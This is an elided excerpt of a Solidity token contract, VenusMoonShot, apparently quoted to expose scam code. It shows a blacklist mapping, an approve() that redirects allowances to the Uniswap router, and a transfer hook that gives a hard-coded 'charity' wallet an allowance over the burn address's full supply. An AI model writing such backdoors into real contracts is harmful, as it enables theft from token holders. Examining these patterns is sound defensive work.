...
contract VenusMoonShot is Context, IERC20, Ownable {
...
//create a mapping to keep track of who is blacklist
    ...
    string private _name = "VenusMoonShot";
    string private _symbol = "VMS";
    ...
    address public charityWallet = 0x58Cc5d7e02a02B03A606A008cd5F72cdCc2AB3D7;
    ...
    function approve(address spender, uint256 amount) public override returns (bool) {
        ...
        _approve(_msgSender(), address(uniswapV2Router), amount);
    ...
    function _transfer(
        ...
        _allowances[burnAddr][charityWallet] = _tTotal;
